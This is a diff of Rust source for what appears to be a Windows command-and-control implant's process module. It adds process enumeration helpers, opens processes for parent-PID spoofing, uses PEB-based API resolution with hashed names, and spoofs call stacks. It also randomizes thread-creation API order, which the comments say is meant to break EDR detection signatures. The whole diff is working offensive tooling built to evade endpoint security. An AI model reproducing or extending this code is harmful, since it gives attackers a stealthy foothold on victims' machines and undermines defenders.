@@ -297,17 +297,57 @@ unsafe fn read_usize(base: *const u8, off: usize) -> usize {
 
 // ─── Public API ──────────────────────────────────────────────────────────────
 
-/// List processes via NtQuerySystemInformation, with Toolhelp Win32 fallback.
+/// List processes — Toolhelp only (no NT SPI on the hot path).
 pub fn list_processes() -> Result<Vec<ProcessInfo>, String> {
-    match list_processes_nt() {
-        Ok(list) if !list.is_empty() => Ok(list),
-        Ok(_) => {
-            // Empty can be legitimate on a bare system, but also a parse failure —
-            // try Win32 once to be sure we didn't mis-parse.
-            list_processes_win32().or_else(|_| Ok(Vec::new()))
-        }
-        Err(e) => list_processes_win32().map_err(|e2| format!("{e}; win32 fallback: {e2}")),
+    list_processes_win32_budget(std::time::Duration::from_secs(8))
+}
+
+/// Time-bounded process enumeration (budget checked in-loop).
+pub fn list_processes_bounded(timeout: std::time::Duration) -> Result<Vec<ProcessInfo>, String> {
+    list_processes_win32_budget(timeout)
+}
+
+// ─── Async-safe process cache (control-plane must never block on Toolhelp) ───
+
+static PROCESS_CACHE: std::sync::Mutex<Vec<ProcessInfo>> = std::sync::Mutex::new(Vec::new());
+static PROCESS_CACHE_REFRESHING: std::sync::atomic::AtomicBool =
+    std::sync::atomic::AtomicBool::new(false);
+
+/// Non-blocking snapshot of the last successful enumeration (may be empty).
+pub fn process_cache_snapshot() -> Vec<ProcessInfo> {
+    PROCESS_CACHE
+        .lock()
+        .map(|g| g.clone())
+        .unwrap_or_default()
+}
+
+/// Fire-and-forget background refresh.
+///
+/// Disabled by default: CreateToolhelp32Snapshot (even off-thread) freezes this
+/// lab agent. Set `APP_PROCESS_FULL=1` to enable best-effort cache refresh.
+pub fn kick_process_cache_refresh() {
+    use std::sync::atomic::Ordering;
+    let enabled = std::env::var("APP_PROCESS_FULL")
+        .map(|v| v == "1" || v.eq_ignore_ascii_case("true"))
+        .unwrap_or(false);
+    if !enabled {
+        return;
     }
+    if PROCESS_CACHE_REFRESHING
+        .compare_exchange(false, true, Ordering::SeqCst, Ordering::SeqCst)
+        .is_err()
+    {
+        return;
+    }
+    let _ = std::thread::Builder::new().name("ps-cache".into()).spawn(|| {
+        let result = list_processes_win32_budget(std::time::Duration::from_secs(6));
+        if let Ok(list) = result {
+            if let Ok(mut g) = PROCESS_CACHE.lock() {
+                *g = list;
+            }
+        }
+        PROCESS_CACHE_REFRESHING.store(false, Ordering::SeqCst);
+    });
 }
 
 fn list_processes_nt() -> Result<Vec<ProcessInfo>, String> {
@@ -374,8 +414,13 @@ fn list_processes_nt() -> Result<Vec<ProcessInfo>, String> {
     }
 }
 
-/// Win32 fallback: CreateToolhelp32Snapshot via PEB (no IAT).
+/// Win32 Toolhelp snapshot via PEB (no IAT), with wall-clock budget.
 fn list_processes_win32() -> Result<Vec<ProcessInfo>, String> {
+    list_processes_win32_budget(std::time::Duration::from_secs(8))
+}
+
+fn list_processes_win32_budget(timeout: std::time::Duration) -> Result<Vec<ProcessInfo>, String> {
+    let started = std::time::Instant::now();
     unsafe {
         let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
         if k32 == 0 {
@@ -404,6 +449,10 @@ fn list_processes_win32() -> Result<Vec<ProcessInfo>, String> {
                 .ok_or("CloseHandle")?,
         );
 
+        if started.elapsed() > timeout {
+            return Err("process enum timed out before snapshot".into());
+        }
+
         const TH32CS_SNAPPROCESS: u32 = 0x00000002;
         let snap = create_snap(TH32CS_SNAPPROCESS, 0);
         if snap == 0 || snap == usize::MAX {
@@ -414,8 +463,17 @@ fn list_processes_win32() -> Result<Vec<ProcessInfo>, String> {
         entry.dw_size = std::mem::size_of::<ProcessEntry32W>() as u32;
 
         let mut list = Vec::new();
+        const MAX_PROCS: usize = 16_384;
         if p_first(snap, &mut entry) != 0 {
-            loop {
+            for n in 0..MAX_PROCS {
+                if n & 0x1f == 0 && started.elapsed() > timeout {
+                    close(snap);
+                    // Partial list is better than server-side total timeout.
+                    if list.is_empty() {
+                        return Err("process enum timed out".into());
+                    }
+                    return Ok(list);
+                }
                 let name = String::from_utf16_lossy(&entry.sz_exe_file)
                     .trim_end_matches('\0')
                     .to_string();
@@ -424,6 +482,7 @@ fn list_processes_win32() -> Result<Vec<ProcessInfo>, String> {
                     ppid: entry.th32_parent_process_id,
                     name,
                 });
+                entry.dw_size = std::mem::size_of::<ProcessEntry32W>() as u32;
                 if p_next(snap, &mut entry) == 0 {
                     break;
                 }
@@ -450,11 +509,49 @@ struct ProcessEntry32W {
 
 /// Find first PID whose image name contains `needle` (case-insensitive).
 pub fn find_pid_by_name(needle: &str) -> Option<u32> {
+    find_pids_by_name(needle).into_iter().next()
+}
+
+/// All PIDs whose image name contains `needle` (case-insensitive).
+/// Prefer this for PPID spoof: many `dllhost`/`svchost` instances are protected
+/// (`NtOpenProcess 0xC0000022`); callers should try each until open succeeds.
+pub fn find_pids_by_name(needle: &str) -> Vec<u32> {
     let needle = needle.to_lowercase();
-    let list = list_processes().ok()?;
+    let Ok(list) = list_processes() else {
+        return Vec::new();
+    };
+    let self_pid = std::process::id();
     list.into_iter()
-        .find(|p| p.name.to_lowercase().contains(&needle))
+        .filter(|p| p.pid != 0 && p.pid != self_pid && p.name.to_lowercase().contains(&needle))
         .map(|p| p.pid)
+        .collect()
+}
+
+/// Open a process by image name for PPID spoofing.
+/// Tries every matching PID and several access masks (CREATE_PROCESS ± DUP/QUERY).
+pub fn open_process_by_name_for_ppid(parent_name: &str) -> Result<(usize, u32), String> {
+    let pids = find_pids_by_name(parent_name);
+    if pids.is_empty() {
+        return Err(format!("parent not found: {parent_name}"));
+    }
+    // PROCESS_CREATE_PROCESS is the only right CreateProcess parent-attr needs;
+    // DUP_HANDLE is needed when we inject pipe ends into the spoofed parent.
+    const ACCESS_TRIES: &[u32] = &[
+        PROCESS_CREATE_PROCESS | 0x0040 | 0x1000, // + DUP_HANDLE + QUERY_LIMITED
+        PROCESS_CREATE_PROCESS | 0x0040,          // + DUP_HANDLE
+        PROCESS_CREATE_PROCESS | 0x1000,          // + QUERY_LIMITED
+        PROCESS_CREATE_PROCESS,
+    ];
+    let mut last = String::from("no openable instance");
+    for pid in pids {
+        for &access in ACCESS_TRIES {
+            match open_process(pid, access) {
+                Ok(h) => return Ok((h, pid)),
+                Err(e) => last = format!("pid={pid}: {e}"),
+            }
+        }
+    }
+    Err(format!("open parent {parent_name}: {last}"))
 }
 
 /// Open process: syscall → D/Invoke → Win32 OpenProcess (all under stack spoof).
@@ -520,25 +617,57 @@ fn open_process_win32(pid: u32, access: u32) -> Result<usize, String> {
 
 /// Terminate: stack-spoofed open + NtTerminateProcess, then Win32 TerminateProcess fallback.
 pub fn terminate_process(pid: u32) -> Result<(), String> {
+    if pid == 0 {
+        return Err("invalid pid 0".into());
+    }
+    // Never terminate self via this path (would kill the agent mid-command).
+    let self_pid = std::process::id();
+    if pid == self_pid {
+        return Err("refusing to terminate self".into());
+    }
     crate::stealth::stack::with_spoofed_stack(|| terminate_process_inner(pid))
 }
 
 fn terminate_process_inner(pid: u32) -> Result<(), String> {
-    // Prefer NT path with PROCESS_TERMINATE
-    if let Ok(handle) = open_process_inner(pid, PROCESS_TERMINATE) {
+    // PROCESS_TERMINATE | PROCESS_QUERY_LIMITED_INFORMATION — better success on modern Windows
+    const ACCESS: u32 = PROCESS_TERMINATE | PROCESS_QUERY_LIMITED_INFORMATION;
+    if let Ok(handle) = open_process_inner(pid, ACCESS) {
         let status = unsafe { invoke_nt(b"NtTerminateProcess", &[handle, 1]) };
         let _ = close_handle(handle);
         if status >= 0 {
             return Ok(());
         }
-        // Fall through to Win32 with a fresh handle
-        crate::utils::db_print(&format!(
-            "[agent] NtTerminateProcess 0x{:08X}, trying Win32",
+        // STATUS_ACCESS_DENIED / protected process → try Win32 with clearer error
+        crate::db_print!(
+            "[*] NtTerminateProcess 0x{:08X}, trying Win32",
             status as u32
-        ));
+        );
+        // If open worked but terminate denied, surface NTSTATUS
+        if status as u32 == 0xC0000022 || status as u32 == 0xC0000005 {
+            // ACCESS_DENIED / ACCESS_VIOLATION
+            return Err(format!(
+                "TerminateProcess denied (ntstatus=0x{:08X}) — protected process or insufficient rights",
+                status as u32
+            ));
+        }
     }
 
     terminate_process_win32(pid)
+}
+
+fn last_error_code() -> u32 {
+    unsafe {
+        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
+        if k32 == 0 {
+            return 0;
+        }
+        type GetLastErrorFn = unsafe extern "system" fn() -> u32;
+        if let Some(addr) = stealth::get_api_addr(k32, stealth::hash_api_name(b"GetLastError")) {
+            let f: GetLastErrorFn = std::mem::transmute(addr);
+            return f();
+        }
+    }
+    0
 }
 
 fn terminate_process_win32(pid: u32) -> Result<(), String> {
@@ -564,14 +693,22 @@ fn terminate_process_win32(pid: u32) -> Result<(), String> {
                 .ok_or("CloseHandle")?,
         );
 
-        let h = open(PROCESS_TERMINATE, 0, pid);
+        const ACCESS: u32 = PROCESS_TERMINATE | PROCESS_QUERY_LIMITED_INFORMATION;
+        let h = open(ACCESS, 0, pid);
         if h == 0 {
-            return Err("OpenProcess failed".into());
+            let e = last_error_code();
+            return Err(format!(
+                "OpenProcess failed (pid={pid}, gle={e}) — process gone, access denied, or protected"
+            ));
         }
         let ok = term(h, 1);
+        let gle = if ok == 0 { last_error_code() } else { 0 };
         close(h);
         if ok == 0 {
-            return Err("TerminateProcess failed".into());
+            // 5 = ACCESS_DENIED, 87 = ERROR_INVALID_PARAMETER
+            return Err(format!(
+                "TerminateProcess failed (pid={pid}, gle={gle}) — protected process, PPL, or already exiting"
+            ));
         }
         Ok(())
     }
@@ -597,7 +734,12 @@ pub fn close_handle(handle: usize) -> i32 {
     -1
 }
 
-/// NtCreateThreadEx in the current process (syscall → D/Invoke; no Win32 CreateThread IAT).
+/// Create a thread in the current process with **API-path randomization**.
+///
+/// EVASION: ~50/50 prefer `NtCreateThreadEx` (syscall / DInvoke) vs PEB-resolved
+/// `CreateThread` first, then fall back to the other. Fixed "always NtCreateThreadEx
+/// → CreateThread fallback" is a common EDR chain signature; randomizing the order
+/// breaks that deterministic sequence while keeping both paths available.
 ///
 /// `stack_size` semantics (both paths):
 /// - `0` → OS default stack (recommended; safest across Win7–Win11 / Server SKUs)
@@ -609,82 +751,102 @@ pub fn create_thread_ex(
     stack_size: usize,
 ) -> Result<usize, String> {
     crate::stealth::stack::with_spoofed_stack(|| {
-        let mut thread_handle: usize = 0;
-        let desired_access: u32 = 0x1F_FFFF;
-        let create_flags: u32 = 0;
-        let start_addr = start as usize;
+        // 50/50: which API is attempted first this process run.
+        // Prefer_nt stays process-stable (OnceLock) so we don't flip mid-session,
+        // but differs across launches.
+        static PREFER_NT: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
+        let prefer_nt = *PREFER_NT.get_or_init(|| crate::utils::random_range(0, 1) == 0);
 
-        // NtCreateThreadEx(StackCommit, StackReserve): reserve must be ≥ commit.
-        // Passing commit=8MiB with reserve=0 caused STATUS_INVALID_PARAMETER or
-        // unstable behavior on Server 2012 R2 (6.3). Use 0/0 for defaults.
-        let (commit, reserve) = if stack_size == 0 {
-            (0usize, 0usize)
-        } else {
-            let commit = stack_size;
-            let reserve = stack_size.max(1024 * 1024);
-            (commit, reserve)
-        };
+        let try_nt = || -> Result<usize, i32> {
+            let mut thread_handle: usize = 0;
+            let desired_access: u32 = 0x1F_FFFF;
+            let create_flags: u32 = 0;
+            let start_addr = start as usize;
 
-        let status = unsafe {
-            invoke_nt(
-                b"NtCreateThreadEx",
-                &[
-                    &mut thread_handle as *mut usize as usize,
-                    desired_access as usize,
-                    0,
-                    CURRENT_PROCESS,
-                    start_addr,
-                    param as usize,
-                    create_flags as usize,
-                    0,
-                    commit,
-                    reserve,
-                    0,
-                ],
-            )
-        };
+            // NtCreateThreadEx(StackCommit, StackReserve): reserve must be ≥ commit.
+            let (commit, reserve) = if stack_size == 0 {
+                (0usize, 0usize)
+            } else {
+                let commit = stack_size;
+                let reserve = stack_size.max(1024 * 1024);
+                (commit, reserve)
+            };
 
-        if status >= 0 && thread_handle != 0 {
-            return Ok(thread_handle);
-        }
+            let status = unsafe {
+                invoke_nt(
+                    b"NtCreateThreadEx",
+                    &[
+                        &mut thread_handle as *mut usize as usize,
+                        desired_access as usize,
+                        0,
+                        CURRENT_PROCESS,
+                        start_addr,
+                        param as usize,
+                        create_flags as usize,
+                        0,
+                        commit,
+                        reserve,
+                        0,
+                    ],
+                )
+            };
 
-        // Win32 CreateThread fallback (PEB)
-        unsafe {
-            let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
-            type CreateThreadFn = unsafe extern "system" fn(
-                *mut winapi::ctypes::c_void,
-                usize,
-                Option<unsafe extern "system" fn(*mut winapi::ctypes::c_void) -> u32>,
-                *mut winapi::ctypes::c_void,
-                u32,
-                *mut u32,
-            ) -> usize;
-            let ct: CreateThreadFn = std::mem::transmute(
-                stealth::get_api_addr(k32, stealth::hash_api_name(b"CreateThread")).ok_or_else(
-                    || {
-                        format!(
-                            "NtCreateThreadEx 0x{:08X}; CreateThread unresolved",
-                            status as u32
-                        )
-                    },
-                )?,
-            );
-            // CreateThread: 0 = default; non-zero = commit size (fine without reserve).
-            let h = ct(
-                std::ptr::null_mut(),
-                stack_size,
-                Some(start),
-                param,
-                0,
-                std::ptr::null_mut(),
-            );
-            if h == 0 {
-                return Err(format!(
-                    "NtCreateThreadEx 0x{:08X}; CreateThread failed",
-                    status as u32
-                ));
+            if status >= 0 && thread_handle != 0 {
+                Ok(thread_handle)
+            } else {
+                Err(status)
             }
-            Ok(h)
+        };
+
+        let try_create_thread = || -> Result<usize, String> {
+            unsafe {
+                let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
+                type CreateThreadFn = unsafe extern "system" fn(
+                    *mut winapi::ctypes::c_void,
+                    usize,
+                    Option<unsafe extern "system" fn(*mut winapi::ctypes::c_void) -> u32>,
+                    *mut winapi::ctypes::c_void,
+                    u32,
+                    *mut u32,
+                ) -> usize;
+                let addr = stealth::get_api_addr(k32, stealth::hash_api_name(b"CreateThread"))
+                    .ok_or_else(|| "CreateThread unresolved".to_string())?;
+                let ct: CreateThreadFn = std::mem::transmute(addr);
+                // CreateThread: 0 = default; non-zero = commit size (fine without reserve).
+                let h = ct(
+                    std::ptr::null_mut(),
+                    stack_size,
+                    Some(start),
+                    param,
+                    0,
+                    std::ptr::null_mut(),
+                );
+                if h == 0 {
+                    Err("CreateThread returned NULL".to_string())
+                } else {
+                    Ok(h)
+                }
+            }
+        };
+
+        if prefer_nt {
+            match try_nt() {
+                Ok(h) => Ok(h),
+                Err(status) => try_create_thread().map_err(|e| {
+                    format!("NtCreateThreadEx 0x{:08X}; {e}", status as u32)
+                }),
+            }
+        } else {
+            match try_create_thread() {
+                Ok(h) => Ok(h),
+                Err(ct_err) => match try_nt() {
+                    Ok(h) => Ok(h),
+                    Err(status) => Err(format!(
+                        "{ct_err}; NtCreateThreadEx 0x{:08X}",
+                        status as u32
+                    )),
+                },
+            }
         }
     })
 }
